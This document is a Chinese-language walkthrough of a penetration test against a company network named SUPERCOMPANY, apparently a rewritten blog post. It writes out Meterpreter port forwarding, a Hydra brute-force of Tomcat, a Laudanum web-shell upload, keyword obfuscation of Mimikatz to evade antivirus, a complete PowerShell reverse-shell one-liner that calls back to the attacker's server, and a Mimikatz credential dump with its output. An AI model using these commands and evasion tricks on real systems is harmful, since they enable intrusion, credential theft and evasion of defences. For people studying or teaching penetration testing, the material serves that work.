### 优化后的文本

#### 端口转发和初始发现
在Meterpreter中，我们执行了以下命令进行端口转发：
```plaintext
meterpreter> portfwd add -L 127.0.0.1 -l 8002 -r 192.168.178.195 -p 8080
```
我们注意到公司的电话簿通过80端口暴露在访客网络上，但具体原因尚不清楚。初步扫描未发现明显漏洞，因此我们决定进一步检查8080端口。

#### Apache Tomcat身份验证
访问8080端口时，我们遇到了Apache Tomcat的基本身份验证。使用Hydra进行爆破后，几分钟内成功用`admin/password123456`登录系统。进入Tomcat管理控制台后，我们推测这是由于防火墙配置错误导致的，因为无论是Tomcat管理控制台还是公司电话簿都不应暴露在访客网络中。

#### 上传Web Shell
为了与底层操作系统交互，我们计划在Tomcat上上传一个shell。服务器指纹显示这是一台Windows服务器。我们使用Laudanum Injectable Web Exploit Code构造了一个war-archive，并在管理页面上传了包含以下文件的war包：
- `cmd.jsp`：用于与`cmd.exe`进行交互
- `m.ps1`：经过混淆和免杀处理的`mimikatz.ps1`脚本，用于抓取密码和哈希值

#### 脚本混淆
为了绕过检测，我们对PowerShell脚本进行了混淆。主要修改包括将`Invoke-mimikatz`改为`Invoke-mymy`等关键字替换。此外，在脚本末尾添加了`Invoke-mymy -dumpcreds`以直接执行功能。

#### 执行Web Shell
上传完成后，我们在浏览器中访问了`cmd.jsp`，确认当前用户以`SYSTEM`权限运行服务。接下来，我们收集了一些环境变量信息：
```plaintext
命令: cmd /c set
结果:
    ALLUSERSPROFILE=C:\ProgramData
    COMPUTERNAME=SRVINTRANET
    USERDOMAIN=SUPERCOMPANY
    USERNAME=SRVINTRANET$
```
我们获取到了计算机名`SRVINTRANET`，它属于`SUPERCOMPANY`域。

#### 收集系统信息
继续使用`systeminfo`命令检索其他有用信息：
```plaintext
命令: systeminfo
结果:
    Host Name: SRVINTRANET
    OS Name: Microsoft Windows Server 2012 R2 Standard
    OS Version: 6.3.9600 N/A Build 9600
    OS Manufacturer: Microsoft Corporation
    OS Configuration: Member Server
    OS Build Type: Multiprocessor Free
    Registered Owner: Windows User
    ...
```

#### 域控制器信息
使用`nltest`命令获取域控制器列表：
```plaintext
命令: cmd /c nltest /dclist:supercompany
结果:
    Get a list of DCs in domain 'supercompany' from '\SRVDC1'.
    srvdc1.supercompany.local[PDC] [DS]Site: Default-First-Site-Name
    srvdc2.supercompany.local [DS]Site: Default-First-Site-Name
    The command completed successfully
```

#### 切换到更稳定的Shell
由于Android设备可能已经开始发热且不再适合我们的工作，我们决定切换到一个基于PowerShell的shell。通过Tomcat上的web shell，我们安装了Powershell后门并执行单向回连命令，同时在公网服务器上用netcat监听80端口：
```powershell
cmd /c powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('',80); $s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb=(IEX $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'>'; $sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
该脚本创建一个TCPClient对象，反向连接到我们的机器，打开I/O流，并使用`InvokeExpression`来执行输入的内容。不幸的是，这次没有收到反向shell，可能是服务器无法访问互联网。

#### 使用Mimikatz
我们再次转向Tomcat的web shell，并安装了混淆过的`mimikatz`：
```powershell
cmd /c powershell -executionpolicy bypass -f c:\tomcat\webapps\cmd\war\files\m.ps1
```
运行`sekurlsa::logonpasswords`命令后，我们获得了本地管理员的密码哈希：
```plaintext
mimikatz(powershell) # sekurlsa::logonpasswords
...
* Username : Administrator
* Domain : SRVINTRANET
* NTLM : 604603ab105adc8XXXXXXXXXXXXXXXXX
* SHA1 : 7754ff505598bf3XXXXXXXXXXXXXXXXXXXXXXXXX
...
```
由于目标服务器是Windows Server 2012，WDigest凭证不再存储明文密码（自Windows Server 2008起），因此我们未能获取到明文密码。

#### 查找可访问互联网的服务器
最后，我们使用`net view`命令获取可用的共享服务器列表，寻找可以访问互联网的服务器：
```plaintext
Server Name            Remark
---------------------- ---------------------------
\SRVDC1                Domain controller PDC
\SRVDC2                Domain Controller
\SRVWSUS               Server WSUS
\SRVAV                 Server AV
\SRVFILE1              File Server
```

这就是我们在渗透过程中所采取的步骤和发现。